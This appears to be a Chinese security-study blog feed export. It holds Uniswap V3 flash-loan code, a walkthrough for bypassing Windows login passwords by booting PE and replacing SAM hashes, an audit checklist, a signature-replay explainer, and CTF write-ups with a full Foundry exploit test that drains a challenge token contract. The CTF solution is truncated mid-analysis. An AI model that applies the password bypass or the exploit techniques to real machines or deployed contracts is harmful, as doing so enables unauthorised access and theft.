class="line"></span><br><span class="line">    // 计算借贷所需要扣除的手续费</span><br><span class="line">    uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);</span><br><span class="line">    uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);</span><br><span class="line">    // 记录下当前的余额</span><br><span class="line">    uint256 balance0Before = balance0();</span><br><span class="line">    uint256 balance1Before = balance1();</span><br><span class="line"></span><br><span class="line">    // 将所需 token 发送给借贷方</span><br><span class="line">    if (amount0 &gt; 0) TransferHelper.safeTransfer(token0, recipient, amount0);</span><br><span class="line">    if (amount1 &gt; 0) TransferHelper.safeTransfer(token1, recipient, amount1);</span><br><span class="line"></span><br><span class="line">    // 调用借贷方地址的回调函数，将函数用户传入的 data 参数传给这个回调函数</span><br><span class="line">    IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);</span><br><span class="line"></span><br><span class="line">    // 记录调用完成后的余额</span><br><span class="line">    uint256 balance0After = balance0();</span><br><span class="line">    uint256 balance1After = balance1();</span><br><span class="line"></span><br><span class="line">    // 比对借出代币前和回调函数调用完成后余额的数量，对于每个 token，余额只能多不能少</span><br><span class="line">    require(balance0Before.add(fee0) &lt;= balance0After, &#x27;F0&#x27;);</span><br><span class="line">    require(balance1Before.add(fee1) &lt;= balance1After, &#x27;F1&#x27;);</span><br><span class="line"></span><br><span class="line">    // 手续费相关的计算</span><br><span class="line">    uint256 paid0 = balance0After - balance0Before;</span><br><span class="line">    uint256 paid1 = balance1After - balance1Before;</span><br><span class="line"></span><br><span class="line">    if (paid0 &gt; 0) &#123;</span><br><span class="line">        uint8 feeProtocol0 = slot0.feeProtocol % 16;</span><br><span class="line">        uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;</span><br><span class="line">        if (uint128(fees0) &gt; 0) protocolFees.token0 += uint128(fees0);</span><br><span class="line">        feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);</span><br><span class="line">    &#125;</span><br><span class="line">    if (paid1 &gt; 0) &#123;</span><br><span class="line">        uint8 feeProtocol1 = slot0.feeProtocol &gt;&gt; 4;</span><br><span class="line">        uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;</span><br><span class="line">        if (uint128(fees1) &gt; 0) protocolFees.token1 += uint128(fees1);</span><br><span class="line">        feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h3><p>通过 <code>UniswapV3Pool.swap()</code> 函数，可以完成 <code>flashswap</code> 的功能，这个函数在<a href="https://paco0x.org/uniswap-v3-3/">Uniswap v3 详解（三）：交易过程</a>已经有过详细的描述。</p><p>在使用 <code>flashswap</code> 时，需要实现其 <code>IUniswapV3SwapCallback</code> 接口，完成闪电贷的还贷即可，这里不再赘述具体实现。</p>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.uniswap_v1_theory</title>
      <link href="/2023/08/01/03.Uniswap/01.uniswap_v1_theory/"/>
      <url>/2023/08/01/03.Uniswap/01.uniswap_v1_theory/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v1-theory"><a href="#uniswap-v1-theory" class="headerlink" title="uniswap_v1_theory"></a>uniswap_v1_theory</h1><p>没啥好说的，学习V2就好，V1主要就是只支持ETH作为中介的token交换，不支持两种token之间的直接交换</p>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.PE破解系统密码</title>
      <link href="/2023/07/31/06.Windows%20Security/02.PE%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/"/>
      <url>/2023/07/31/06.Windows%20Security/02.PE%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="PE破解系统密码"><a href="#PE破解系统密码" class="headerlink" title="PE破解系统密码"></a>PE破解系统密码</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>PE系统，独立于硬盘系统的微型系统，通过PE系统启动可以对系统的SAM文件做修改。账户密码存储文件：c:\windows\system32\config\SAM</p><ul><li>利用PE破解系统密码的原理是：潜入SAM文件里，SAM文件里都是Hash值，PE破解的方法就是自己设置一段密码，利用Hash算法转化为一段值，然后替换SAM中的Hash值,也就是把加密的密文修改了。</li><li>但是，开机过程中SAM文件时不允许被打开的，所以我们要准备一个U盘，把这个U盘做成系统，在U盘上安装一个微型维修操作系统。</li><li>实际上，开机的时候有启动顺序，正常来说时从硬盘引导，这我们要设置为U盘引导，进而进入PE的操作界面，这时真正的windows操作系统处于关闭状态，这里就可以在PE中找工具打开windows的SAM。</li></ul><p>本来的场景是：主机和U盘。我们这么攻击，就相当于U盘变成主机，主机变成U盘，U盘可以操作主机的内容</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><blockquote><p>由于我的U盘被我使用PE工具搞坏了，在VMWare添加新硬盘的时候检测不到U盘，因此无法实践，报废了一个U盘，淦。</p><p>如果要做VMWare实验，推荐的做法：（1）首先将一个好的U盘通过VMWare添加硬盘，设置VMWare从u盘启动的功能。（2）然后通过WEPE工具来格式化U盘。（3）进入BIOS设置从U盘优先启动，方可进入PE</p><p>真机就容易了：U盘装有PE软件，开机的时候按热键，然后设置U盘启动即可。</p><p>视频可参考：<a href="https://www.bilibili.com/video/BV1cv411J7ZG/?spm_id_from=444.42.list.card_archive.click&amp;vd_source=0cc0401ee122346d6680e90658b0ed1a">B站</a>，<a href="https://www.bilibili.com/video/BV1Lf4y1t7Mc/?p=24&amp;spm_id_from=333.788.top_right_bar_window_history.content.click&amp;vd_source=0cc0401ee122346d6680e90658b0ed1a">B站</a></p></blockquote><p>1.插入U盘，U盘内装有安装好的PE软件。由于使用虚拟机，因此直接载入ISO文件</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215028883.png" alt></p><p>2.开机的时候进入BIOS，虚拟机可利用“打开电源时进入固定固件”，然后将USB（光盘）优先磁盘启动</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215149577.png" alt></p><p>3.启动之后就进入这个画面，选择第二个</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215243682.png" alt></p><p>4.重启会是PE加载</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215300739.png" alt></p><p>5.进入桌面，这是一个只有56M大小的XP PE系统</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215323402.png" alt></p><p>6.点击桌面的破解WINDOWS登录密码，点击更改口令</p><p><img src="https://moe.photo/images/2023/07/31/image-20230731215416852.png" alt></p><p><img src="/2023/07/31/06.Windows%20Security/02.PE%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230731215434323-16908167301661.png" alt></p><p>7.重启之后，进入BIOS选择磁盘优先。或者直接拔掉U盘。然后就发现密码成功被修改，进入到系统。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PE破解可以理解成外面那些电脑维修服务的工作，拿到了电脑，就可以破解密码。Windows系列都可以这么操作，不局限于XP，7，10，11都可以这么操作。那么会有人说，这样电脑不是一点都不安全了吗？我认为安全是建立在一定条件下的，主机都到别人手里了，谈安全就没有意义了。而且PE破解是无法抑制的，相当于U盘是操作系统，你的主机变成了U盘，操作系统肯定可以处理修改你的U盘（主机）数据嘛，这无法抗拒。</p>]]></content>
      
      
      <categories>
          
          <category> 06.Windows Security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.How to audit a project</title>
      <link href="/2023/07/31/11.experience/01.How%20to%20audit%20a%20project/"/>
      <url>/2023/07/31/11.experience/01.How%20to%20audit%20a%20project/</url>
      
        <content type="html"><![CDATA[<h1 id="How-to-audit-a-project"><a href="#How-to-audit-a-project" class="headerlink" title="How to audit a project"></a>How to audit a project</h1><ol><li>将仓库克隆到本地，如果对项目非常陌生，建议看一下文档、白皮书、项目网站、博客等。必须了解：技术设计、项目目标等</li><li>选择自己擅长的工具，比如项目是hardhat写的，然后可以建一个新的foundry，移动过去</li><li>使用<code>cloc . --by-file</code>来排版，得到每个文件中的行数（注意不要计算依赖的），然后放到excel或者生成到markdown中。这样自己就有一个大概的任务认知了，通过标记哪些完成了，哪些没完成，从简单的开始</li><li>审计之前运行一些工具：静态分析工具比如mythx和slither</li><li><p>审计过程中</p><ul><li><p>时刻注意</p><ol><li>找个md文档随时记录下来自己的看法，审计看法</li><li>不要太深入某个单一问题</li><li>对方法进行模糊测试，比如使用foundry</li><li>向开发人员适当提出问题</li></ol></li><li><p>审计</p><ol><li>常见的漏洞</li><li>关键功能的访问控制检查</li><li>合约是否符合标准</li><li>函数的调用逻辑</li></ol></li></ul></li><li><p>编写PoC，我推荐使用Foundry</p></li><li>撰写报告<ol><li>漏洞摘要：对该漏洞的清晰、简洁的描述</li><li>漏洞严重性</li><li>证明：PoC攻击脚本或者任何攻击证明攻击的代码</li><li>修复漏洞的意见</li></ol></li></ol><p>专业技能占一半，编写可读性报告占一半。项目的安全是你和项目方的共同责任，你需要倾尽全力，但是如果最终出现一些问题，也不必自责</p>]]></content>
      
      
      <categories>
          
          <category> 11.experience </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.replay signature @TransferProxy()</title>
      <link href="/2023/07/31/17.signature/01.replay%20signature%20@TransferProxy()/"/>
      <url>/2023/07/31/17.signature/01.replay%20signature%20@TransferProxy()/</url>
      
        <content type="html"><![CDATA[<h1 id="replay-signature-TransferProxy"><a href="#replay-signature-TransferProxy" class="headerlink" title="replay signature @TransferProxy()"></a>replay signature @TransferProxy()</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>定义：<code>TransferProxy()</code> 又叫做代理转账，是一个新提出的 EIP，用户可以用代币支付交易费用，而不是在传统的 ERC20 合约中仅用以太币支付。</p></li><li><p>代理转账旨在解决用户必须持有足够的以太币来支付交易费用才能自由转账的问题。虽然 EIP 仍在审核中，但许多项目已经抢先一步，将 Proxy Transfer 纳入自己的智能合约中，这就造就了很多安全问题</p></li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>A（发送者）发起一笔交易，将 10个 Token 1 发送给 B（接收者）。然后 Alice 用她的签名 → sig(A,B,10) 签署交易。</li><li>交易由代理进行。B 从 A那里得到了 10个 Token 1。</li><li>B在新交易中重放 A的签名</li><li>新的交易由Proxy执行。B在未经 A 授权的情况下从 A 那里获取了 10个 Token 2</li></ol><p><img src="https://moe.photo/images/2023/07/31/TransferProxy.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 17.signature </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/07/30/16.CBSC%20CTF%202022/00.digest/"/>
      <url>/2023/07/30/16.CBSC%20CTF%202022/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1><p>foundry题解<a href="https://github.com/chen4903/CBSC-2022">仓库</a></p>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.challenge_pro</title>
      <link href="/2023/07/30/16.CBSC%20CTF%202022/11.challenge_pro/"/>
      <url>/2023/07/30/16.CBSC%20CTF%202022/11.challenge_pro/</url>
      
        <content type="html"><![CDATA[<h1 id="11-challenge-pro"><a href="#11-challenge-pro" class="headerlink" title="11.challenge_pro"></a>11.challenge_pro</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>两个合约：</p><ul><li>ApproveMain：题目初始化，拥有cert代币</li><li>Cert：ERC20代币，增加了<code>safeCheek()</code>和<code>grant()</code>功能</li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将ApproveMain合约拥有的所有ERC20代币归零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Complete() public returns(bool) &#123;</span><br><span class="line">    if (cert.balanceOf(address(this)) == 0)&#123;</span><br><span class="line">        isComplete = true;</span><br><span class="line">        emit sendflag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    return isComplete;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p><code>getToken()</code>糊弄人的，代币数量太大，不断除以2要非常久才能最后变成1除以2四舍五入等于0，所以这条路走不通。</p><p>唯一能操作的只有这两个方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 特定地址和admin啥也不做，否则</span><br><span class="line">modifier safeCheek(address spender, uint256 amount) &#123;</span><br><span class="line">    if (uint160(tx.origin) &amp; 0xffffff != 0xbeddC4 || tx.origin == admin) &#123;</span><br><span class="line">        _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        grant(spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 将第amount个slot的值设置为tx.origin</span><br><span class="line">function grant(address spender, uint256 amount) internal &#123;</span><br><span class="line">    // spender必须是一个合约，并且代码长度得小于10，长度限制挺苛刻的</span><br><span class="line">    require(spender.code.length &gt; 0 &amp;&amp; spender.code.length &lt; 10);</span><br><span class="line">    AddressSlot storage r;</span><br><span class="line">    bytes32 slot = bytes32(amount);</span><br><span class="line">    assembly &#123;</span><br><span class="line">        r.slot := slot</span><br><span class="line">    &#125;</span><br><span class="line">    r.value = tx.origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要进入<code>grant()</code>，我们只能通过tx.origin的低3字节是<code>beddC4</code>，可以用下面的脚本爆破获得。</p><blockquote><p>但是题目很巧，我们在remix常用的账户<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>满足这个条件，因此CTF需要特殊EOA账户的时候我们可以关注一下remix、hardhat、ganache等工具给的默认账户，题目有时候会从这些地方出题。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak</span><br><span class="line"></span><br><span class="line">g = ecdsa.generator_secp256k1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    private_key = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span> - <span class="number">1</span>)</span><br><span class="line">    public_key = private_key * g</span><br><span class="line">    x = <span class="built_in">str</span>(<span class="built_in">hex</span>(public_key.x())[<span class="number">2</span>:])</span><br><span class="line">    x = (<span class="string">&quot;00&quot;</span> * <span class="number">32</span> + x)[-<span class="number">32</span> * <span class="number">2</span>:]</span><br><span class="line">    y = <span class="built_in">str</span>(<span class="built_in">hex</span>(public_key.y())[<span class="number">2</span>:])</span><br><span class="line">    y = (<span class="string">&quot;00&quot;</span> * <span class="number">32</span> + y)[-<span class="number">32</span> * <span class="number">2</span>:]</span><br><span class="line">    public_key_hex = x + y</span><br><span class="line"></span><br><span class="line">    public_key_bytes = <span class="built_in">bytes</span>.fromhex(public_key_hex)</span><br><span class="line"></span><br><span class="line">    keccak_hash = keccak(public_key_bytes)</span><br><span class="line"></span><br><span class="line">    address = keccak_hash[-<span class="number">20</span>:].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address[<span class="number">34</span>:<span class="number">40</span>] == <span class="string">&quot;beddc4&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(private_key))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0x&quot;</span> + public_key_hex)</span><br><span class="line">        address_with_prefix = <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">        <span class="built_in">print</span>(address_with_prefix)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>虽然能操作slot，但是不是我们能控制改成什么内容，只能将值改成tx.origin，那么就是成为admin。</p><p>因此我们的任务是获得admin，然后<code>approve()</code>和<code>transferFrom()</code>来完成题目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function _approve(</span><br><span class="line">    address owner,</span><br><span class="line">    address spender,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal &#123;</span><br><span class="line">    if(tx.origin==admin)&#123;</span><br><span class="line">        require(msg.sender.code.length&gt;0);</span><br><span class="line">        _allowances[spender][tx.origin] = amount;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">    require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">    _allowances[owner][spender] = amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意：</p><ul><li><p><code>grant()</code>方法中的<code>require(spender.code.length &gt; 0 &amp;&amp; spender.code.length &lt; 10);</code>：普通的方式创建的合约会肯定会超过10，所以我们自己写bytecdoe然后用内联汇编创建合约。写个最简单的：<code>600180f3</code>，他是initcode，用来部署，然后其runtimecode是00，长度为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[00]PUSH101</span><br><span class="line">[02]DUP1</span><br><span class="line">[03]RETURN</span><br></pre></td></tr></table></figure></li><li><p><code>_approve()</code>有要求<code>require(msg.sender.code.length&gt;0);</code>，因此我们需要写个Helper合约来帮我们</p></li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/11.challenge_pro/ApproveMain.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    ApproveMain approveMain;</span><br><span class="line">    Cert cert;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        // 初始化题目</span><br><span class="line">        approveMain = new ApproveMain();</span><br><span class="line">        cert = approveMain.cert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        console.log(&quot;[before attack] level balance:&quot;,cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        // 1.创建一个合约用来作为spender</span><br><span class="line">        address spender;</span><br><span class="line">        &#123;</span><br><span class="line">            bytes memory bytecode = hex&quot;600180f3&quot;;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                spender := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(&quot;spender&#x27;s length:&quot;,spender.code.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 2.符合条件的EOA账户调用</span><br><span class="line">        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line"></span><br><span class="line">        // 3.EOA账户成为admin</span><br><span class="line">        cert.approve(address(spender),uint256(3));</span><br><span class="line"></span><br><span class="line">        // 4.使用Helper帮助我们授权</span><br><span class="line">        Helper helper = new Helper();</span><br><span class="line">        helper.attack(address(cert),address(approveMain));</span><br><span class="line"></span><br><span class="line">        // 5.授权完成之后，我们的EOA账户就可以取钱了</span><br><span class="line">        cert.transferFrom(address(approveMain),address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        // 6.检查是否完成题目</span><br><span class="line">        assertEq(approveMain.Complete(),true);</span><br><span class="line">        console.log(&quot;[after attack] level balance:&quot;,cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    function attack(address _addr, address _to) public&#123;</span><br><span class="line">        Cert(_addr).approve(_to,type(uint256).max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.challenge_pro</title>
      <link href="/2023/07/29/16.CBSC%20CTF%202022/10.challenge_pro/"/>
      <url>/2023/07/29/16.CBSC%20CTF%202022/10.challenge_pro/</url>
      
        <content type="html"><![CDATA[<h1 id="10-challenge-pro"><a href="#10-challenge-pro" class="headerlink" title="10.challenge_pro"></a>10.challenge_pro</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>代码量庞大！但还是按流程进行分析：</p><ul><li>WHT.sol<ul><li>ERC20功能的代币</li></ul></li><li>router.sol<ul><li>interface和library：定义了一大堆接口和引入一大堆库</li><li>Ownable：常规</li><li>MdexRouter：uniswap常规方法，比如添加流动性，移除流动性，交换，计算价格，permit机制</li></ul></li><li>factory.sol<ul><li>interface和library：定义了一大堆接口和引入一大堆库</li><li>MdexERC20：交易所合约，包含转账和permit</li><li>MdexPair：币对合约，包含：锁机制，初始化方法，K值的两个reserve，手续费，ERC20系列方法，交换，价格计算</li><li>MdexFactory：创建币对，手续费，，计算（价格，CREATE2地址），获取reserve信息</li></ul></li><li>deploy.sol<ul><li>Ownable：常规</li><li>USDT：就只是一个普通的ERC20代币合约</li><li>deploy：初始化工作，包括Factory、Router、ERC20的设置，创建币对，创建交易池，空投</li><li>QuintConventionalPool：质押token获取LP然后获取利润</li></ul></li></ul><p>这个题目还给了我们一个部署的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.部署factory合约，调用getInitCodeHash函数获取hash在setInitCodeHash中进行初始化</span><br><span class="line">2.部署router合约，填入factory地址和WHT地址（WHT地址可以为任意不产生影响）</span><br><span class="line">3.部署deploy合约，填入factory和router合约地址，之后调用step1和step2函数进行初始化</span><br><span class="line">4.调用airdrop函数领取初始代币</span><br><span class="line">5.当quintConventionalPool合约的Finished函数返回true时通过</span><br></pre></td></tr></table></figure><p>deploy合约中，将自己和USDT创建为一个币对，币对初始流动性1：1。然后创建池子，deploy合约授权给池子极大的金额，也就是说池子可以操作deploy的所有余额。</p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>通过阅读可知，token、distributor和deploy合约都是同一个东西。token代币合约一开始自己拥有2000000000000000000000000，我们需要将它至少减少到50000000000000000000000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function captureFlag() public returns (bool) &#123;</span><br><span class="line">    if(token.balanceOf(distributor)&lt;=50000000000000000000000)&#123;</span><br><span class="line">    emit flag(&quot;succese&quot;,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>一般这种质押的题目，往往是在质押、转账逻辑方面出题，我们可以先关注有关于这两个的方法，看看有没有非常规或者魔改的方法。通过寻找池子合约中的函数，我们发现了一个非常规的质押函数：<code>restake()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function reStake(uint256 _index) public &#123;</span><br><span class="line">       require(_index &lt; 2, &quot;Invalid index&quot;);</span><br><span class="line">       uint256 preReward;</span><br><span class="line">       if (_index == 0) &#123;</span><br><span class="line">           preReward = calculateTokenReward(msg.sender);</span><br><span class="line">           if (preReward &gt; 0) &#123;</span><br><span class="line">               token.transferFrom(distributor, address(this), preReward);</span><br><span class="line">               stakeToken(msg.sender, preReward);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           preReward = calculateLpReward(msg.sender);</span><br><span class="line">           if (preReward &gt; 0) &#123;</span><br><span class="line">               token.transferFrom(distributor, address(this), preReward);</span><br><span class="line">               stakeToken(msg.sender, preReward);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       emit RESTAKE(msg.sender, preReward);</span><br><span class="line">   